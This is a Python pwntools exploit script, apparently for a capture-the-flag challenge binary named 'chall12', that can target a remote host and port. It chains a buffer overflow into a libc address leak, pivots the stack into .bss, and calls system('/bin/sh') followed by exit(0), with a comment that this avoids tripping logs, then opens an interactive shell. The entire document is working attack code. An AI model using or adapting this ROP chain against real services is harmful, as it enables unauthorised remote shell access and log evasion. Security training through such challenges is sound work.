#!/usr/bin/env python3
from pwn import *
import sys

HOST = ''
PORT = 11536

target_elf = ELF('../bin/chall12')
rop = ROP(target_elf)

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:    
    PORT = sys.argv[2]

if HOST:
    target_libc = ELF('../bin/libc.so.6')
    io = remote(HOST, PORT)
else:
    target_libc = target_elf.libc
    io = target_elf.process()

LIBC   = target_libc.symbols['printf'] # 0x64e80
SYSTEM = target_libc.symbols['system'] # 0x4f440
BINSH  = next(target_libc.search(b'/bin/sh')) # 0x1b3e9a
EXIT   = target_libc.symbols['exit'] # 0x43120

sys.stdout.write(io.recvuntil(b'5!\n'))

GADGET_POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
GADGET_POPS_RET = rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']).address

# step 1: lay first rop chain, it will leak, read a second payload and pivot
ropchain1  = p64(GADGET_POP_RDI_RET)
ropchain1 += p64(target_elf.symbols['got.printf'])
ropchain1 += p64(target_elf.symbols['puts'])  # puts()
ropchain1 += p64(GADGET_POP_RDI_RET)
ropchain1 += p64(target_elf.bss(0x800))  # .data (with enough fake stack)
ropchain1 += p64(target_elf.symbols['gets'])  # gets()
ropchain1 += p64(GADGET_POPS_RET)  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
ropchain1 += p64(target_elf.bss(0x800) - 3*8)  # .data (second rop chain, -3 pops: r13, r14, r15)

io.recvuntil(b': ')
io.sendline(cyclic(24)+ropchain1)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc = leak - LIBC
log.info('Leak: 0x%012x' % leak)
log.info('Libc: 0x%012x' % libc)

# step 2: run system("/bin/sh") with an exit(0) to avoid tripping logs
ropchain2  = p64(GADGET_POP_RDI_RET)
ropchain2 += p64(libc+BINSH)   # "/bin/sh"
ropchain2 += p64(libc+SYSTEM)  # system()
ropchain2 += p64(GADGET_POP_RDI_RET)
ropchain2 += p64(0)     # NULL
ropchain2 += p64(libc+EXIT)    # exit(0)

io.sendline(ropchain2)
io.recvline(timeout=0.1)

# step 3: collect the shell
io.sendline(b'id')
log.success('Shell? %s' % io.recvline().strip())
io.interactive()
